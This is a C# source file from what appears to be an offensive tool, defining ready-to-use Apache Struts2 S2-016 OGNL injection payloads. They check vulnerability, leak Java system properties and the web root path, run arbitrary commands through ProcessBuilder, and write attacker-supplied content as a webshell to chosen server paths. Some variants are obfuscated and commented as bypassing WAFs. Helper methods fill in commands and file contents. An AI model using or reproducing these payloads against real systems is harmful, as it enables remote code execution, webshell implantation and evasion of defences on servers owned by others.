using System;
using System.Collections.Generic;
using System.Text;

namespace payload
{
    public class S2016 : BasePayload
    {
        private String Exp_Check = "redirect:$%7b%23req%3d%23context.get%28%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27%29,%23resp%3d%23context.get%28%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27%29,%23resp.setCharacterEncoding%28%27UTF-8%27%29,%23resp.getWriter%28%29.print%28%22struts2_security_%22%29,%23resp.getWriter%28%29.print%28%22check%22%29,%23resp.getWriter%28%29.flush%28%29,%23resp.getWriter%28%29.close%28%29%7d";


        //private String Exp_VerInfo = "redirect:$%7b%23_memberAccess%3d%40ognl.OgnlContext%40DEFAULT_MEMBER_ACCESS,%23req%3d%23context.get%28%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27%29,%23resp%3d%23context.get%28%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27%29,%23resp.setCharacterEncoding%28%27UTF-8%27%29,%23resp.getWriter%28%29.print%28%22[vername]:%22%29,%23resp.getWriter%28%29.print%28%40java.lang.System%40getProperty%28%22[vername]%22%29%29,%23resp.getWriter%28%29.flush%28%29,%23resp.getWriter%28%29.close%28%29%7d";
        
        //绕过部分waf
        private String Exp_VerInfo = "redirect:$%7b%23_member%41ccess%3d%40og%6el.Og%6elCo%6etext%40DEFAULT_MEMBER_%41CCESS,%23req%3d%23co%6etext.get%28%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27%29,%23resp%3d%23context.get%28%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27%29,%23resp.setCharacterEncoding%28%27UTF-8%27%29,%23resp.getWriter%28%29.print%28%22[vername]:%22%29,%23resp.getWriter%28%29.print%28%40java.lang.%53ystem%40getProperty%28%22[vername]%22%29%29,%23resp.getWriter%28%29.flush%28%29,%23resp.getWriter%28%29.close%28%29%7d";

        private String Exp_Path="redirect:$%7b%23req%3d%23context.get%28%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27%29,%23resp%3d%23context.get%28%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27%29,%23resp.setCharacterEncoding%28%27UTF-8%27%29,%23resp.getWriter%28%29.print%28%22web%22%29,%23resp.getWriter%28%29.print%28%22path:%22%29,%23resp.getWriter%28%29.print%28%23req.getSession%28%29.getServletContext%28%29.getRealPath%28%22/%22%29%29,%23resp.getWriter%28%29.flush%28%29,%23resp.getWriter%28%29.close%28%29%7d";

       //private String Exp_Exec = "redirect:$%7b%23req%3d%23context.get%28%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27%29,%23s%3dnew%20java.util.Scanner%28%28new%20java.lang.ProcessBuilder%28%27[cmd]%27.toString%28%29.split%28%27\\\\s%27%29%29%29.start%28%29.getInputStream%28%29%29.useDelimiter%28%27\\\\AAAA%27%29,%23str%3d%23s.hasNext%28%29?%23s.next%28%29:%27%27,%23resp%3d%23context.get%28%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27%29,%23resp.setCharacterEncoding%28%27UTF-8%27%29,%23resp.getWriter%28%29.println%28%23str%29,%23resp.getWriter%28%29.flush%28%29,%23resp.getWriter%28%29.close%28%29%7d";

        //绕过部分waf
        private String Exp_Exec = "redirect:$%7b%23req%3d%23co%6etext.get%28%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletReq%27%2b%27uest%27%29,%23s%3dnew%20java.util.Scanner%28%28new%20java.lang.%50rocessBuilder%28%27[cmd]%27.toString%28%29.split%28%27\\\\s%27%29%29%29.start%28%29.getInputStream%28%29%29.useDelimiter%28%27\\\\AAAA%27%29,%23str%3d%23s.hasNext%28%29?%23s.next%28%29:%27%27,%23resp%3d%23co%6etext.get%28%27co%27%2b%27m.open%27%2b%27symphony.xwo%27%2b%27rk2.disp%27%2b%27atcher.HttpSer%27%2b%27vletRes%27%2b%27ponse%27%29,%23resp.setCharacterEncoding%28%27UTF-8%27%29,%23resp.getWriter%28%29.println%28%23str%29,%23resp.getWriter%28%29.flush%28%29,%23resp.getWriter%28%29.close%28%29%7d";

        private String Exp_Upload = "redirect:$%7b%23req%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29,%23res%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29,%23res.getWriter%28%29.print%28%22oko%22%29,%23res.getWriter%28%29.print%28%22kok/%22%29,%23res.getWriter%28%29.print%28%23req.getContextPath%28%29%29,%23res.getWriter%28%29.flush%28%29,%23res.getWriter%28%29.close%28%29,new+java.io.BufferedWriter%28new+java.io.FileWriter%28%23req.getRealPath(%27/[pathfilename]%27)%29%29.append%28%23req.getParameter%28%22shell%22%29%29.close%28%29%7d&shell=[filecontent]";
        //自定义路径
        private String Exp_SetMyUpload = "redirect:$%7b%23req%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletRequest%27%29,%23res%3d%23context.get%28%27com.opensymphony.xwork2.dispatcher.HttpServletResponse%27%29,%23res.getWriter%28%29.print%28%22oko%22%29,%23res.getWriter%28%29.print%28%22kok/%22%29,%23res.getWriter%28%29.print%28%23req.getContextPath%28%29%29,%23res.getWriter%28%29.flush%28%29,%23res.getWriter%28%29.close%28%29,new+java.io.File%28%27[path]%27%29.mkdirs%28%29,new+java.io.BufferedWriter%28new+java.io.FileWriter%28%27[pathfilename]%27%29%29.append%28%23req.getParameter%28%22shell%22%29%29.close%28%29%7d&shell=[filecontent]";


        public String Get_Exp_Check()
        {
            return this.Exp_Check;
        }
        public String Get_Exp_VerInfo(String vername)
        {
            return this.Exp_VerInfo.Replace("[vername]", vername); ;
        }
        public String Get_Exp_Path() {
            return this.Exp_Path;
        }
        public String Get_Exp_Exec(String cmd)
        {
            return this.Exp_Exec.Replace("[cmd]",cmd);
        }
        public String Get_Exp_Upload(String path,String fileName,String fileContent)
        {
            if ("".Equals(path))
            {
                this.Exp_Upload=this.Exp_Upload.Replace("[pathfilename]", fileName);
                return this.Exp_Upload.Replace("[filecontent]", fileContent);
            }
            else {
                this.Exp_SetMyUpload = this.Exp_SetMyUpload.Replace("[path]", path);
                this.Exp_SetMyUpload = this.Exp_SetMyUpload.Replace("[pathfilename]",path+"/"+fileName);
                return this.Exp_SetMyUpload.Replace("[filecontent]", fileContent);
            }
            
        }
    }
}
